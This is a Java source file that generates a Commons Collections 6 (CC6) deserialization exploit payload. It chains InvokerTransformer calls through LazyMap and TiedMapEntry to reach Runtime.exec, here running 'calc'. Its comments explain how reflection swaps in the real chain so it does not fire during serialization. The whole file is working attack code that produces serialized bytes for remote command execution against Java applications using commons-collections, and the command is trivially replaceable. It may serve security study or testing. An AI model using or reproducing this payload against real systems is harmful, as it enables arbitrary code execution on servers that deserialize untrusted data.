package com.xiaoqiu.payload;

/**
 * @Description :
 * @Time : 2023/4/18 19:00
 * @Author : xiaoqiuxx
 */

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CC6 {
    public byte[] getPayload() throws Exception{
        Transformer[] faketransformer = new Transformer[]{new ChainedTransformer(new Transformer[]{ new ConstantTransformer(1) })};

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class }, new String[]{"calc"}),
                new ConstantTransformer(1) };

// 传入fake防止序列化时执行
        Transformer transformerChain = new ChainedTransformer(faketransformer);
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry tme = new TiedMapEntry(outerMap,"key");
        HashMap expMap = new HashMap();
        expMap.put(tme,"value");
        outerMap.remove("key");

// 到最后生成payload的时候，利用反射把真正的transform换进去
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, transformers);

// 序列化数据
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(expMap);
        oos.close();

        return barr.toByteArray();
    }
}

